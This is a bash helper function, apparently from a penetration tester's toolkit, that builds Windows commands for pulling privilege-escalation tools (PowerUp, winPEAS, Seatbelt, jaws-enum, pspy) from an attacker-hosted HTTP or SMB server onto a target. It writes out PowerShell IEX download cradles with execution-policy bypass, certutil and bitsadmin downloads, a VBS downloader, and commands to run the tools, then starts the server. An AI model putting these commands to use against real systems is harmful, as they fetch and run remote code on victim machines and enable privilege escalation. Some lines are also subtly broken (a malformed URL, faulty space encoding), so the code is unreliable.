
mtInitialWindows () {
  if [[ -z "$1" || -z "$2" ]]; then 
    echo "ERROR: INVALID PARAMETERS"
    echo "valid download_methods: vbs|powershell|certutil|bitsadmin|smb"
    echo "Usage: miw <port> <download_method> [destination_prefix]"
    echo "Usage: miw 80 certutil "

    return
  fi
   
  rm /tmp/download_tmp.txt 2>/dev/null
  if [ "$2" = "vbs" ]; then
    printf "## USING cscript.exe \n" >> /tmp/download_tmp.txt
    printf "# Create .vbs script and execute\n" >> /tmp/download_tmp.txt
    printf "del downloadfile.vbs 2>nul\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set Arg = WScript.Arguments >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo If WScript.Arguments.Count ^<^> 2 Then >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Invalid number of arguments\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs <download_url> <destination_path>\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs \"\"http:///$(getip a)$1/powerup.ps1\"\" \"\"C:\\\\users\\public\\downloads\\powerup.ps1\"\"\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Quit >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo End If >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo strFileURL = Arg(0) 'CHANGE LOCATION  >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo strHDLocation = Arg(1) 'DESTINAION  >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo ' Fetch the file >> downloadfile.vbs\n"
    printf "echo     Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo     objXMLHTTP.open \"GET\", strFileURL, false >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo     objXMLHTTP.send() >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Open >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Position = 0    'Set the stream position to the start >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set objFSO = CreateObject(\"Scripting.FileSystemObject\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objFSO = Nothing >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Close >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objADOStream = Nothing >> downloadfile.vbs\n"
    printf "echo End if >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set objXMLHTTP = Nothing >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf ">>>>>>>>>>>>> USE THIS COMMAND TO EXECUTE DOWNLOAD <<<<<<<<<<<<<<<<<\n" >> /tmp/download_tmp.txt
    printf "cscript.exe downloadfile.vbs\n" >> /tmp/download_tmp.txt
  fi 


  windownf () {
    if [ ! -z $1 ]; then
      port=":$1"
    fi


    if [[ -z "$2" || -z "$3" || -z "$4" ]]; then 
      echo "ERROR: INVALID PARAMETERS"
      echo "valid download_methods: vbs|powershell1|powershell2|certutil|bitsadmin|smb"
      echo "Usage: miw <port> <download_method> <src_path> <dest_path>"
      echo "Usage: miw 80 certutil ./powerup.ps1 C:\users\public\downloads\powerup.ps1"
      return
    fi


    if [ "$2" = "smb" ]; then
      printf "copy \"\\\\\\\\$(getip a)\\\\share\\\\$3\" \"$4\"\n" | tr '/' '\\'
    fi
    

    if [ "$2" = "vbs" ]; then
      tmp=$(echo $3 | sed 's/ /%20/g')
      echo -e "cscript.exe downloadfile.vbs \"http://$(getip a)$port/$tmp\" \"$4\""
    fi
    # printf "cscript.exe downloadfile.vbs\n\n"

    ## ONLY FOR RUNNING .ps1 FILES
    if [ "$2" = "powershell1" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "powershell.exe -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$port/$tmp')"
    fi

    if [ "$2" = "powershell2" ]; then
      tmp=$(urlencode $3)
      echo -e "powershell.exe -ep bypass Invoke-Webrequest 'http://$(getip a)$port/$tmp' -OutFile \"$4\"" 
    fi

    
    if [ "$2" = "certutil" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "certutil.exe -urlcache -split -f \"http://$(getip a)$port/$tmp\" \"$4\"" 
        
    fi
    
    if [ "$2" = "bitsadmin" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "bitsadmin /transfer myDownloadJob /download /priority normal \"http://$(getip a)$port/$tmp\" \"$4\"" 
    fi 
  }



  cd /opt/hacking-myTools

  # download
  echo "---- DOWNLOAD ----"
  windownf "$1" "$2" "useful_files/files/windows/github/PowerSploit/Privesc/PowerUp.ps1" "$3PowerUp.ps1" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "tools/privesc/windows/pspy.exe" "$3pspy.exe" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/all/github/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/Obfuscated Releases/winPEASany.exe" "$3winPEASany.exe" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/windows/jaws-enum.ps1" "$3jaws-enum.ps1" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/windows/github/Ghostpack-CompiledBinaries/Seatbelt.exe" "$3Seatbelt.exe" >> /tmp/download_tmp.txt
   

  cat /tmp/download_tmp.txt
  cat /tmp/download_tmp.txt | clip

  # execute
  echo
  echo "---- EXECUTE from cmd.exe ----"
  printf "mkdir output 2>nul\n"
  echo -e "start /B winPEASany.exe > .\output\winpeas.txt"
  echo -e "start /B Seatbelt.exe > .\output\seatbelt.txt"
  echo -e "start /B pspy.exe C:/users/public/downloads/pspyoutput.txt"
  echo -e "echo Invoke-AllChecks >> PowerUp.ps1"
  echo -e "powershell.exe -ep bypass .\PowerUp.ps1 > .\output\PowerUp.txt"
  echo -e "powershell.exe -ep bypass .\jaws-enum.ps1 > .\output\jaws-enum.txt"
  # start /B C:\users\public\downloads\pspy.exe C:\users\public\downloads\pspyoutput.txt

  echo
  echo
  echo "---- EXECUTE from powershell ----"
  # powershell
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/winPEASany.exe" > "$path/output/winpeas.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/Seatbelt.exe" > "$path/output/seatbelt.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/pspy.exe" "$path/output/pspyoutput.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/PowerUp.ps1"; Invoke-AllChecks > "$path/output/powerup.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/jaws-enum.ps1" > "$path/output/jaws-enum.txt" } -argumentlist (get-location).path'


  echo "-----------------------"
  echo

  if [ "$2" = "smb" ]; then
    hostsmb
  else 
    hosthttp 80
  fi 
}


# start-job -scriptblock { get-location  }